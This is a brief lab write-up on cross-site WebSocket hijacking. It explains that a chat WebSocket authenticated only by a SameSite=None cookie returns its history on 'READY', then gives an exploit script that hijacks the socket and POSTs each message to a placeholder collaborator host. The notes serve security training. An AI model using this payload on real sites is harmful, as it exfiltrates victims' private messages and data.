## Lab: Cross-site WebSocket hijacking

Defense:
- Websocket connection rely only on a session cookie
- and the session cookie is set 'SameSite: None'
- Send "Ready" and receives all history message

Bypass:
- a csrf websocket hijacking

```
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```